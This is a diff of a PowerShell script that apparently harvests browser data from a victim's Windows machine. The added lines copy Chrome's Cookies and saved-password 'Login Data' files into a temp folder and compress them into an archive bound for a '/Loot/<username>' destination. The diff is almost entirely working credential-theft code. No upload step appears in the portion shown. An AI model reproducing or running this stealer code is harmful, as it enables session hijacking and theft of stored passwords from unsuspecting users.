@@ -8,14 +8,19 @@
 # Version: 1.0
 # 
 
-
+$GLoginPath = "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Login Data"
 $GcookiesPath = "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
-$GfilePath = "$env:temp\Cookies"
-$GdestinationPath = "/Loot/$env:USERNAME/Cookies"
+$GoogleFolderPath = "$env:tmp\Google-UserData\"
+$GfilePath = "$env:temp\Google-UserData.zip"
+$GdestinationPath = "/Loot/$env:USERNAME/Google-UserData.zip"
+
+mkdir $env:tmp\Google-UserData
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
-Copy-Item -Path $GcookiesPath -Destination $GfilePath -Force
+Copy-Item -Path $GcookiesPath -Destination $GoogleFolderPath -Force
+Copy-Item -Path $GLoginPath -Destination $GoogleFolderPath -Force
+Compress-Archive -Path $GoogleFolderPath -DestinationPath $GfilePath
 
 #------------------------------------------------------------------------------------------------------------------------------------
 #
